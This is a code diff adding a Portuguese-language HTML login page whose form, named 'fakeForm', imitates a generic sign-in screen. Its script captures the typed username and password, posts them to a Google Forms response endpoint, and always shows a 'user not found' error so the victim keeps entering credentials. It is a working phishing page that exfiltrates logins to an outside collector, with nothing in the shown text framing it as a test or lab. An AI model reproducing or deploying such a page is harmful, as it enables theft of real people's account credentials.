@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="estilo.css">
+</head>
+<body>
+
+<div class="container">
+
+    <!-- AGORA É UM FORM -->
+    <form class="login-box" id="fakeForm">
+
+        <img src="download.png" alt="Logo do site" class="logo">
+
+        <!-- IDs adicionados -->
+        <input type="text" id="user" placeholder="Nome de usuário, email ou celular" required>
+        <input type="password" id="pass" placeholder="Senha" required>
+
+        <!-- Botão submit -->
+        <button type="submit">Entrar</button>
+
+        <p class="error-msg" id="errorMsg">Usuário não encontrado</p>
+
+        <a href="#" class="forgot">Esqueceu a senha?</a>
+
+    </form>
+
+    <a href="#" class="create-account">Criar nova conta</a>
+</div>
+
+<script>
+    document.getElementById("fakeForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+    
+        const user = document.getElementById("user").value;
+        const pass = document.getElementById("pass").value;
+    
+        const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScCbNhFWWPN1-6gcVEh_jSY5G6haP5B_I6aQZOn2sVJwaZrDQ/formResponse";
+    
+        const data = new FormData();
+        data.append("entry.1363807566", user);
+        data.append("entry.530425353", pass);
+    
+        fetch(formURL, {
+            method: "POST",
+            mode: "no-cors",
+            body: data
+        });
+    
+        // MOSTRA SEMPRE O ERRO
+        document.getElementById("errorMsg").style.display = "block";
+    });
+    </script>
+    
+
+</body>
+</html>
